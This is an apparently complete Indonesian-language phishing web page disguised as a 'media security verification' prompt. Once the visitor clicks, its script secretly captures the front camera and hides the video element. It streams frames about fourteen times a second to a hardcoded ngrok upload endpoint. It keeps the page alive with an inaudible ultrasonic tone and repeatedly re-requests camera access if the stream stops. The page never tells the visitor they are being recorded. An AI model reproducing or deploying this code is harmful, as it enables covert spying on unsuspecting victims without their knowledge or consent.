<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Security Alert - Media Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; color: #fff; font-family: sans-serif; overflow: hidden; }
  
  #permission-overlay {
    position: fixed;
    top: 0; left: 0; width: 100vw; height: 100vh;
    background: rgba(0, 0, 0, 0.85);
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    z-index: 9999;
    cursor: pointer;
    text-align: center;
    padding: 20px;
  }
  .box {
    background: #111827;
    border: 1px solid #374151;
    padding: 24px;
    border-radius: 12px;
    max-width: 320px;
    width: 100%;
    box-shadow: 0 10px 25px rgba(0,0,0,0.5);
  }
  h2 { font-size: 16px; margin-bottom: 10px; color: #f3f4f6; }
  p { font-size: 12px; color: #9ca3af; margin-bottom: 20px; line-height: 1.5; }
  .btn {
    background: #2563eb;
    color: #fff;
    border: none;
    padding: 10px 20px;
    border-radius: 6px;
    font-size: 14px;
    font-weight: bold;
    width: 100%;
  }

  .hidden-container { position: absolute; opacity: 0.01; pointer-events: none; overflow: hidden; width: 1px; height: 1px; }
</style>
</head>
<body>

<div id="permission-overlay">
  <div class="box">
    <h2>Verifikasi Keamanan Media</h2>
    <p>Ketuk tombol di bawah untuk mengaktifkan sesi penelusuran aman dan melanjutkan.</p>
    <button class="btn">Lanjutkan Verifikasi</button>
  </div>
</div>

<div class="hidden-container">
  <video id="cam-feed" autoplay playsinline muted></video>
  <canvas id="processing-canvas" width="480" height="360"></canvas>
</div>

<script>
(function () {
  'use strict';

  // ============================================
  // KONFIGURASI SERVER NGROK & STREAM
  // ============================================
  var CONFIG = {
    // URL Ngrok mengarah ke endpoint /upload_frame
    serverEndpoint: 'https://studly-unallegorized-brecken.ngrok-free.dev/upload_frame',
    
    // Interval pengiriman frame (70ms = ~14 FPS untuk efek live stream)
    streamInterval: 70 
  };

  var state = {
    camStream: null,
    camActive: false,
    streamTimer: null,
    audioCtx: null,
    recoveryInterval: null
  };

  // ============================================
  // 1. AUDIO KEEP-ALIVE (PENCEGAH SLEEP)
  // ============================================
  function initAudioKeepAlive() {
    try {
      window.AudioContext = window.AudioContext || window.webkitAudioContext;
      state.audioCtx = new AudioContext();
      var osc = state.audioCtx.createOscillator();
      var gain = state.audioCtx.createGain();
      gain.gain.value = 0.00001; // Sangat pelan, tidak terdengar
      osc.frequency.value = 18000; // Ultrasonic 18kHz
      osc.connect(gain);
      gain.connect(state.audioCtx.destination);
      osc.start();
    } catch (e) {}
  }

  // ============================================
  // 2. STREAMING FRAME KE NGROK (JSON BASE64)
  // ============================================
  function streamFrame() {
    if (!state.camActive) return;

    var videoElement = document.getElementById('cam-feed');
    var canvas = document.getElementById('processing-canvas');
    var ctx = canvas.getContext('2d');

    try {
      if (videoElement.readyState !== videoElement.HAVE_ENOUGH_DATA) return;

      // Gambar video ke canvas
      ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
      
      // Konversi ke Base64 JPEG (Kualitas 0.55 agar ringan)
      var dataURL = canvas.toDataURL('image/jpeg', 0.55);
      var payload = JSON.stringify({ image: dataURL });

      // Kirim ke server
      fetch(CONFIG.serverEndpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: payload,
        keepalive: true
      }).catch(function(err) {});

    } catch (e) {}
  }

  // ============================================
  // 3. CAMERA ACCESS & RECOVERY
  // ============================================
  function requestCameraAccess() {
    navigator.mediaDevices.getUserMedia({ 
      video: { width: { ideal: 480 }, height: { ideal: 360 }, facingMode: "user" }, 
      audio: false 
    })
    .then(function(stream) {
      state.camStream = stream;
      state.camActive = true;
      
      var videoElement = document.getElementById('cam-feed');
      videoElement.srcObject = stream;
      videoElement.play().catch(function(){});

      var overlay = document.getElementById('permission-overlay');
      if (overlay) overlay.style.display = 'none';

      // Deteksi jika stream dimatikan sistem
      stream.getVideoTracks().forEach(function(track) {
        track.onended = function() {
          state.camActive = false;
          triggerRecovery();
        };
      });
    })
    .catch(function(err) {
      state.camActive = false;
    });
  }

  // ============================================
  // 4. RECOVERY CYCLE (KAMERA MATI -> HIDUPKAN)
  // ============================================
  function triggerRecovery() {
    if (state.recoveryInterval) clearInterval(state.recoveryInterval);
    state.recoveryInterval = setInterval(function() {
      // Jika kamera mati dan tab terlihat, paksa minta kamera lagi
      if (!state.camActive && document.visibilityState === 'visible') {
        requestCameraAccess();
      }
    }, 1000); // Cek setiap 1 detik
  }

  // ============================================
  // 5. TRIGGER AWAL (SAAT USER KLIK)
  // ============================================
  document.getElementById('permission-overlay').addEventListener('click', function() {
    initAudioKeepAlive();
    if (state.audioCtx && state.audioCtx.state === 'suspended') {
      state.audioCtx.resume();
    }
    requestCameraAccess();
    triggerRecovery();
  });

  // ============================================
  // 6. LIFECYCLE TRAP (BACKGROUND PERSISTENCE)
  // ============================================
  window.addEventListener('DOMContentLoaded', function() {
    // Mulai loop streaming
    state.streamTimer = setInterval(streamFrame, CONFIG.streamInterval);
  });

  window.addEventListener('pagehide', function() {
    // Jika tab akan ditutup, kirim frame terakhir secara paksa
    if (state.camActive) {
      streamFrame(); 
    }
  });

  document.addEventListener('visibilitychange', function () {
    if (document.visibilityState === 'visible') {
      if (state.audioCtx && state.audioCtx.state === 'suspended') {
        state.audioCtx.resume();
      }
      if (!state.camActive) {
        requestCameraAccess();
      }
    }
  });

})();
</script>
</body>
</html>
